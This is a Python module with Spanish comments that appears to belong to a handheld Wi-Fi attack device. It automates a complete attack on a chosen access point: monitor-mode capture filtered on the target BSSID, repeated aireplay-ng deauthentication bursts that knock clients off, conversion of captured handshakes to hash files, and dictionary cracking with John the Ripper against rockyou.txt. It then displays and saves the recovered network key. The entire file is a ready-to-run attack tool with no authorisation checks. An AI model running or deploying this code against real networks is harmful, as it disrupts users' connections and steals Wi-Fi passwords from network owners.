#!/usr/bin/env python3
# /opt/beetle/tools/wifi
# hcxtools_runner.py

import subprocess
import time
import os
import signal
import atexit
import sys
from display.screen import MenuDisplay

IFACE = "mon0"
MON_UP_CMD = ["sudo", "mon0up"]
MON_DOWN_CMD = ["sudo", "mon0down"]

# procesos hijos registrados para limpieza
_child_procs = []
_cleanup_done = False

def run_cmd(cmd, **kwargs):
    """Wrapper simple sobre subprocess.run con opciones comunes."""
    kw = {"stdout": subprocess.DEVNULL, "stderr": subprocess.DEVNULL, "text": True}
    kw.update(kwargs)
    return subprocess.run(cmd, **kw)

def _run_mon_cmd(cmd, timeout=4.0):
    """Ejecuta sudo mon0up/mon0down y devuelve (rc, stdout, stderr)."""
    try:
        p = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=timeout)
        return p.returncode, (p.stdout or ""), (p.stderr or "")
    except Exception as e:
        return -1, "", str(e)

def _iface_exists() -> bool:
    return os.path.isdir(f"/sys/class/net/{IFACE}")

def start_mon0(wait_seconds: float = 2.0) -> bool:
    """
    Fuerza levantar mon0 con `sudo mon0up`. Espera hasta `wait_seconds`
    y devuelve True si /sys/class/net/mon0 existe.
    """
    # Ejecutar comando una vez (o dos intentos cortos)
    attempts = 2
    for i in range(attempts):
        try:
            rc, out, err = _run_mon_cmd(MON_UP_CMD)
        except Exception:
            rc, out, err = -1, "", "exception"
        # si el kernel/driver informa "Operation not supported", lo consideramos no-fatal
        combined = (out or "") + (err or "")
        if rc != 0 and ("Operation not supported" in combined or "operation not supported" in combined):
            pass
        # esperar la aparición
        deadline = time.time() + wait_seconds
        while time.time() < deadline:
            if _iface_exists():
                return True
            # pequeño sleep para Pi Zero
            time.sleep(0.2)
    # comprobación final
    return _iface_exists()

def stop_mon0() -> None:
   
    try:
        rc, out, err = _run_mon_cmd(MON_DOWN_CMD)
        combined = (out or "") + (err or "")
        # Si indica que el dispositivo no existe, lo consideramos exitoso (ya estaba abajo)
        if "device \"mon0\" does not exist" in combined.lower() or "no such device" in combined.lower():
            return
    except Exception:
        # ignorar y seguir
        pass
    # Breve espera para que el kernel procese la bajada
    time.sleep(0.3)

def _register_proc(p):
    """Registrar un proceso hijo para poder terminarlo más tarde."""
    try:
        if p and p not in _child_procs:
            _child_procs.append(p)
    except Exception:
        pass

def _terminate_child_procs(timeout=3):
    """Intentar terminar ordenadamente todos los procesos registrados."""
    global _child_procs
    for p in list(_child_procs):
        try:
            if p.poll() is None:
                try:
                    p.terminate()
                    p.wait(timeout=timeout)
                except Exception:
                    try:
                        p.kill()
                    except Exception:
                        pass
        except Exception:
            pass
    _child_procs = []

def _cleanup():
    """Limpieza final: termina procesos y baja mon0 (siempre)."""
    global _cleanup_done
    if _cleanup_done:
        return
    _cleanup_done = True
    try:
        _terminate_child_procs()
    except Exception:
        pass
    try:
        stop_mon0()
    except Exception:
        pass

# Registrar cleanup para salida normal
atexit.register(_cleanup)

def _signal_handler(signum, frame):
    """Manejador de señales para terminar limpio."""
    _cleanup()
    # Salimos con el código 128 + signo
    code = 128 + (signum if isinstance(signum, int) else 1)
    try:
        sys.exit(code)
    except SystemExit:
        os._exit(code)

signal.signal(signal.SIGINT, _signal_handler)
signal.signal(signal.SIGTERM, _signal_handler)

# --------------------- Función principal ---------------------

def run_hcxtools(ssid, bssid, channel, capture_time=60, wordlist="/usr/share/wordlists/rockyou.txt"):
    """
    Ejecuta hcxdumptool en mon0 con filtro al BSSID, hace deauth periódicos con aireplay-ng,
    convierte la captura a .22000 y genera archivo para John the Ripper, luego intenta crackearlo.
    Al finalizar (o en error) termina procesos y llama siempre a `sudo mon0down`.
    """
    display = MenuDisplay()
    iface = IFACE
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    folder = os.path.abspath(os.path.join(os.path.dirname(__file__), "/opt/beetle/reports/wifi"))
    os.makedirs(folder, exist_ok=True)

    safe_ssid = "".join(c for c in ssid if c.isalnum() or c in "-_")
    base = os.path.join(folder, f"hcxdump_{safe_ssid}_{timestamp}")
    pcapng = base + ".pcapng"
    hccap = base + ".22000"
    john_in = base + ".john"
    log_file = base + ".log"
    result_file = base + "_result.txt"
    filter_file = "/tmp/ap_filter.txt"

    # Mostrar inicio
    display.show_message([f"HCXTOOLS:", f"{ssid}", f"Canal {channel}"], center=True)
    time.sleep(0.8)

    # Asegurar que mon0 esté arriba (siempre usar sudo mon0up)
    if not start_mon0(wait_seconds=2.0):
        display.show_message(["No se pudo levantar", "mon0"], center=True)
        time.sleep(2)
    
        _cleanup()
        return None

    # crear filterlist
    try:
        with open(filter_file, "w") as f:
            f.write(bssid + "\n")
    except Exception:
        # no crítico, continuar sin filterlist si hay problema al escribir
        pass

    # fijar canal en mon0
    run_cmd(["sudo", "iw", "dev", iface, "set", "channel", str(channel)])

    # construir comando hcxdumptool
    cmd = [
        "sudo", "hcxdumptool",
        "-i", iface,
        f"--filterlist_ap={filter_file}",
        "--filtermode=2",
        "--enable_status=15",
        "-o", pcapng
    ]

    display.show_message(["Capturando tráfico...", f"{capture_time}s"], center=True)
    try:
        with open(log_file, "w") as log:
            proc = subprocess.Popen(cmd, stdout=log, stderr=log, text=True)
            _register_proc(proc)

          
            elapsed = 0
            deauth_interval = 10
            deauth_pkt = "15"  # paquetes por envío
            while elapsed < capture_time:
                # comprobar si proceso principal finalizó por algun motivo
                if proc.poll() is not None:
                    break
                display.show_message([f"Capturando... {elapsed}s", "Enviando deauth"], center=True)
                try:
                    subprocess.run([
                        "sudo", "aireplay-ng",
                        "--deauth", deauth_pkt,
                        "-a", bssid,
                        iface
                    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
                except Exception:
                    # ignorar fallos puntuales en aireplay
                    pass
                # dormir en pequeños intervalos para responder a señales
                slept = 0.0
                while slept < deauth_interval and elapsed < capture_time:
                    time.sleep(0.5)
                    slept += 0.5
                    elapsed += 0.5
                    # si se recibió señal la limpieza se ejecutará por el handler
                    # comprobación rápida de proc
                    if proc.poll() is not None:
                        break

            # terminar hcxdumptool de forma ordenada
            try:
                if proc.poll() is None:
                    proc.terminate()
                    proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                try:
                    proc.kill()
                except Exception:
                    pass
            except Exception:
                pass

            # asegurarnos de limpiar el registro
            try:
                _child_procs.remove(proc)
            except Exception:
                pass

    except Exception:
        # en caso de error al lanzar captura
        display.show_message(["Error en captura", "hcxdumptool"], center=True)
        time.sleep(2)
        _cleanup()
        return None

    # Verificar pcapng
    if not os.path.isfile(pcapng) or os.path.getsize(pcapng) < 10000:
        display.show_message(["Captura inválida", "Sin tráfico útil"], center=True)
        time.sleep(2)
        _cleanup()
        return None

    # Analizar resumen con hcxpcapngtool --summary
    display.show_message(["Analizando handshake..."], center=True)
    try:
        result = subprocess.check_output(["hcxpcapngtool", "--summary", pcapng],
                                         stderr=subprocess.DEVNULL, text=True)
        if ("written PMKIDs" in result and ": 0" in result and
            "written EAPOL RSN handshake(s)" in result and ": 0" in result):
            display.show_message(["Sin handshakes", "válidos detectados"], center=True)
            time.sleep(2)
            _cleanup()
            return None
    except Exception:
        display.show_message(["Error al analizar", "la captura"], center=True)
        time.sleep(2)
        _cleanup()
        return None

    # Convertir a .22000
    display.show_message(["Convirtiendo a .22000"], center=True)
    try:
        run_cmd(["hcxpcapngtool", "-o", hccap, pcapng])
    except Exception:
        pass

    if not os.path.isfile(hccap):
        display.show_message(["Error en conversión", "a .22000"], center=True)
        time.sleep(2)
        _cleanup()
        return None

    # Generar archivo para John (hcxhashtool o hcxpcapngtool)
    display.show_message(["Preparando archivo", "para John the Ripper"], center=True)
    try:
        ret = subprocess.run(["hcxhashtool", "-i", hccap, f"--john={john_in}"],
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if ret.returncode != 0 or not os.path.isfile(john_in):
            # intentar fallback
            fallback = subprocess.run(["hcxpcapngtool", "--john", john_in, hccap],
                                      stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if fallback.returncode != 0 or not os.path.isfile(john_in):
                display.show_message(["Error generando", "archivo para John"], center=True)
                time.sleep(2)
                _cleanup()
                return None
    except FileNotFoundError:
        display.show_message(["hcxhashtool no encontrado"], center=True)
        time.sleep(2)
        _cleanup()
        return None
    except Exception:
        display.show_message(["Error al ejecutar", "hcxhashtool/hcxpcapngtool"], center=True)
        time.sleep(2)
        _cleanup()
        return None

    if not os.path.isfile(john_in) or os.path.getsize(john_in) == 0:
        display.show_message(["Archivo John vacío", "No hay hashes"], center=True)
        time.sleep(2)
        _cleanup()
        return None

    # Verificar wordlist
    if not os.path.isfile(wordlist):
        display.show_message(["Wordlist no encontrada"], center=True)
        time.sleep(2)
        _cleanup()
        return None

    # Ejecutar John the Ripper
    display.show_message(["Crackeando con", "John the Ripper..."], center=True)
    john_cmd = [
        "john",
        f"--wordlist={wordlist}",
        "--format=wpapsk",
        john_in
    ]

    try:
        proc_john = subprocess.Popen(john_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        _register_proc(proc_john)

        start_time = time.time()
        while True:
            line = proc_john.stdout.readline()
            if not line:
                if proc_john.poll() is not None:
                    break
                # mantener UI responsiva
                time.sleep(0.1)
                if time.time() - start_time > 0.5:
                    display.show_message(["John ejecutándose..."], center=True)
                    start_time = time.time()
                continue
            trimmed = line.strip()
            if trimmed:
                # Mostrar fragmentos en dos columnas breves (mantenerlo simple)
                display.show_message([trimmed[:20], trimmed[20:40] if len(trimmed) > 20 else ""], center=True)

        # esperar un poco que termine (no bloquear largo)
        try:
            proc_john.wait(timeout=1)
        except Exception:
            pass

        # quitar de la lista de procesos
        try:
            _child_procs.remove(proc_john)
        except Exception:
            pass
    except Exception:
        try:
            proc_john.terminate()
        except Exception:
            pass
        display.show_message(["Error al ejecutar", "John the Ripper"], center=True)
        time.sleep(2)
        _cleanup()
        return None

    # Revisar resultados con john --show
    try:
        show_out = subprocess.check_output(["john", "--show", "--format=wpapsk", john_in],
                                           stderr=subprocess.DEVNULL, text=True)
    except subprocess.CalledProcessError:
        try:
            show_out = subprocess.check_output(["john", "--show", john_in],
                                               stderr=subprocess.DEVNULL, text=True)
        except Exception:
            show_out = ""

    key = None
    for line in (show_out or "").splitlines():
        line = line.strip()
        if not line or ":" not in line:
            continue
        parts = line.split(":")
        candidate = parts[-1].strip()
        if candidate:
            key = candidate
            break

    # Resultado final
    if key:
        display.show_message(["¡Clave encontrada!", key], center=True)
        try:
            with open(result_file, "w") as f:
                f.write(f"SSID: {ssid}\nKEY: {key}\n")
        except Exception:
            pass
        time.sleep(4)
        _cleanup()
        return key
    else:
        display.show_message(["No crackeado", "Fin intento"], center=True)
        try:
            with open(result_file, "w") as f:
                f.write(f"SSID: {ssid}\nKEY NOT FOUND\n")
        except Exception:
            pass
        time.sleep(2)
        _cleanup()
        return None

# Si se ejecuta directamente, aviso corto
if __name__ == "__main__":
    print("Módulo hcxtools_runner.py: usar la función run_hcxtools(ssid, bssid, channel, ...) desde otro script.")

